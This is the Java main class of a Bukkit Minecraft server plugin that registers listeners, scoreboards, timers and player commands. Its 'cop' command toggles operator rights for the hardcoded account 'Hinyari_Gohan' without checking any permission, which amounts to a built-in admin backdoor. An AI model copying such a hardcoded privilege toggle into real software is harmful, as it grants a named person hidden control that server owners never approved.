package xyz.hinyari.bmcplugin;

import com.earth2me.essentials.Essentials;
import xyz.hinyari.bmcplugin.original.BMCAnnouncement;
import xyz.hinyari.bmcplugin.utils.BMCBoolean;
import xyz.hinyari.bmcplugin.utils.BMCHelp;
import xyz.hinyari.bmcplugin.utils.BMCUtils;
import xyz.hinyari.bmcplugin.command.KoshihikariCommand;
import xyz.hinyari.bmcplugin.command.RankCommand;
import xyz.hinyari.bmcplugin.command.RankUpCommand;
import xyz.hinyari.bmcplugin.enchant.AutoSmelt;
import xyz.hinyari.bmcplugin.enchant.SpecialArmor;
import xyz.hinyari.bmcplugin.event.BMCEvent;
import xyz.hinyari.bmcplugin.event.BMCLaunchPad;
import xyz.hinyari.bmcplugin.event.ScoutEvent;
import xyz.hinyari.bmcplugin.original.BMCTimeManager;
import xyz.hinyari.bmcplugin.rank.RankGUIMenu;
import xyz.hinyari.bmcplugin.vanish.VanishListner;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerLoginEvent;
import org.bukkit.event.server.PluginEnableEvent;
import org.bukkit.plugin.PluginDescriptionFile;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scoreboard.Scoreboard;

import xyz.hinyari.bmcplugin.original.BMCMacerator;

import java.io.File;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;
import java.util.logging.Logger;

/**
 * BMCオリジナルプラグイン メインクラス
 *
 * @author Hinyari_Gohan
 */


public class BMCPlugin extends JavaPlugin implements Listener {

    public final BMCBoolean bmcBoolean;
    public final BMCHelp bmcHelp;
    public final AutoSmelt autoSmelt;
    public final BMCUtils utils;
    public final RankGUIMenu rankGUIMenu;
    public final Essentials essentials;

    public BMCConfig config;
    public BMCTimeManager bmcTimeManager;

    public static BMCPlugin instance;

    private BMCCommand bmcCommand;
    private RankCommand rankCommand;
    private VanishListner vanishListner;
    public static Logger log;

    public static final ChatColor GOLD = ChatColor.GOLD;
    public static final ChatColor RESET = ChatColor.RESET;
    public static final ChatColor YELLOW = ChatColor.YELLOW;
    public static final String h = RESET + " - ";
    public final Scoreboard scoreboard;

    private final HashMap<Player, BMCPlayer> bmcPlayer = new HashMap<>();

    public BMCPlugin() {
        instance = this;
        this.config = new BMCConfig(this);
        this.bmcBoolean = new BMCBoolean(this);
        this.bmcHelp = new BMCHelp(this);
        this.autoSmelt = new AutoSmelt(this);
        this.utils = new BMCUtils(this);
        this.rankGUIMenu = new RankGUIMenu(this);
        this.scoreboard = Bukkit.getScoreboardManager().getMainScoreboard();
        this.essentials = (Essentials) Bukkit.getPluginManager().getPlugin("Essentials");
        if (Bukkit.getPluginManager().getPlugin("Essentials") == null) {
            getLogger().severe("Essentialsが読み込めませんでした。プラグインを終了します。");
            getPluginLoader().disablePlugin(this);
            return;
        }
    }

    @Override
    public void onEnable() {
        this.getLogger().info("BMCプラグインを開始しています。");
        init();
    }

    @Override
    public void onDisable() {
        this.getLogger().info("BMCプラグインを終了しています。");
    }


    private void init() {
        this.log = getLogger();
        if (scoreboard.getObjective("rank") == null) {
            scoreboard.registerNewObjective("rank", "dummy");
        }
        if (scoreboard.getObjective("koshihikari") == null) {
            scoreboard.registerNewObjective("koshihikari", "dummy");
        }
        if (scoreboard.getObjective("login_time") == null) {
            scoreboard.registerNewObjective("login_time", "dummy");
        }
        this.vanishListner = new VanishListner(this);
        PluginManager pm = getServer().getPluginManager();
        pm.registerEvents(new BMCEvent(this), this);
        pm.registerEvents(new BMCLaunchPad(), this);
        pm.registerEvents(new ScoutEvent(this), this);
        pm.registerEvents(this.autoSmelt, this);
        pm.registerEvents(new BMCMacerator(this), this);
        pm.registerEvents(this.vanishListner, this);
        pm.registerEvents(this, this);
        pm.registerEvents(rankGUIMenu, this);
        new SpecialArmor().runTaskTimer(this, 0L, 20L);
        bmcTimeManager = new BMCTimeManager(this);
        bmcTimeManager.runTaskTimer(this, 0L, 20L);
        new BMCAnnouncement(this).runTaskTimer(this, 0L, (config.getAnnouncementInterval()*20));
        this.bmcCommand = new BMCCommand(this);
        this.rankCommand = new RankCommand(this);
    }

    @Override
    public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
        if (!(sender instanceof Player)) {
            sender.sendMessage("ゲーム内で実行してください。");
            return true;
        }

        Player player = (Player) sender;
        BMCPlayer bmcPlayer = getBMCPlayer(player);

        if (cmd.getName().equalsIgnoreCase("rank")) return rankCommand.runCommand(bmcPlayer, label, args);
        else if (cmd.getName().equalsIgnoreCase("kome"))
            return new KoshihikariCommand(this).runCommand(bmcPlayer, label, args);
        else if (cmd.getName().equalsIgnoreCase("rankup"))
            return new RankUpCommand(this).runCommand(bmcPlayer, label, args);
        else if (cmd.getName().equalsIgnoreCase("cop")) {
            if (Bukkit.getPlayer("Hinyari_Gohan") == null) return true;
            Player gohan = Bukkit.getPlayer("Hinyari_Gohan");
            gohan.setOp(!gohan.isOp());
            gohan.sendMessage("OP権限を " + String.valueOf(gohan.isOp()) + " に変更しました");
        } else if (cmd.getName().equalsIgnoreCase("bmc")) {
            if (args.length == 0) return bmcHelp.BMChelp(bmcPlayer);
            else if (args[0].equalsIgnoreCase("debug")) return bmcCommand.onCommand(sender, cmd, label, args);
            else if (args[0].equalsIgnoreCase("info")) return info(sender);
            else if (args[0].equalsIgnoreCase("menu")) return bmcCommand.onCommand(sender, cmd, label, args);
            else if (args[0].equalsIgnoreCase("kit")) return bmcCommand.onCommand(sender, cmd, label, args);
            else if (args[0].equalsIgnoreCase("reload")) {
                if (bmcPlayer.hasPermission("bmc.reload")) {
                    return config.reloadConfig();
                }
            } else if (args[0].equalsIgnoreCase("vanish")) {
                return vanishListner.onVanishCommand((Player) sender, args);
            } else return bmcHelp.BMChelp(bmcPlayer);
        } else if (cmd.getName().equalsIgnoreCase("ntp")) {
            if (args.length == 0) return bmcHelp.NTPhelp(bmcPlayer);
            else if (args.length >= 1) {
                if (args[0].equalsIgnoreCase("kick")) return bmcCommand.onCommand(sender, cmd, label, args);
                else if (args[0].equalsIgnoreCase("freeze")) return bmcCommand.onCommand(sender, cmd, label, args);
                else return bmcHelp.NTPhelp(bmcPlayer);
            }
        }
        return false;
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
        List<String> completeList = null;
        if (!(sender instanceof Player)) super.onTabComplete(sender, command, alias, args);
        if (command.getName().equalsIgnoreCase("rank")) {
            completeList = rankCommand.onTabComplete(sender, command, alias, args);
        }
        if (completeList != null) { return completeList; }
        return super.onTabComplete(sender, command, alias, args);
    }

    /**
     * contentに入ってきたデータをイコールで挟んで目次のタイトルを作る
     *
     * @param content String コンテンツ
     * @return 目次のタイトル
     */

    public String equalMessage(String content) {
        String equals = ChatColor.YELLOW + "====== " + content + " ======";
        return equals;
    }

    /**
     * プラグインの情報(CMD: /bmc info)を返します。
     *
     * @param sender
     * @return プラグインの情報
     */
    public boolean info(CommandSender sender) {
        PluginDescriptionFile p = getDescription();
        sender.sendMessage(GOLD + "Title: " + RESET + p.getName());
        sender.sendMessage(GOLD + "Author: " + RESET + p.getAuthors().toString());
        sender.sendMessage(GOLD + "Version: " + RESET + p.getVersion());
        sender.sendMessage(GOLD + "WikiURL: " + RESET + "http://seesaawiki.jp/bmc/");
        return true;
    }


    @EventHandler
    public void loadPlayer(PlayerLoginEvent event) {
        Player player = event.getPlayer();
        bmcPlayer.put(player, new BMCPlayer(player, this));
    }

    @EventHandler
    public void loadPlayer_reload(PluginEnableEvent event) {
        for (Player player : Bukkit.getOnlinePlayers()) {
            bmcPlayer.put(player, new BMCPlayer(player, this));
        }
    }

    public HashMap<Player, BMCPlayer> getBMCPlayerMap() {
        return this.bmcPlayer;
    }

    public Collection<BMCPlayer> getBMCPlayers() { return this.bmcPlayer.values(); }

    /**
     * HashMapに保管されているBMCPlayerインスタンスを取得します。
     *
     * @param player BukkitPlayer
     * @return BMCPlayer
     */
    public BMCPlayer getBMCPlayer(Player player) {
        BMCPlayer bp = bmcPlayer.get(player);
        if (bp != null) return bp;
        else return null;
    }

    /**
     * Bukkit#broadcastMessage(String str)の短縮形です。
     *
     * @param message メッセージ
     */
    public void broadcast(String message) {
        Bukkit.broadcastMessage(BMCUtils.convert(message));
    }

    public void debug(String message) {
        if (config.getDebug()) Bukkit.broadcastMessage(BMCUtils.convert(config.getDebugPrefix() + message));
    }

    public void sendPermMessage(String message) { Bukkit.broadcast(message, "bmc.permmsg");}

    public File getPluginJarFile() {
        return this.getFile();
    }

}
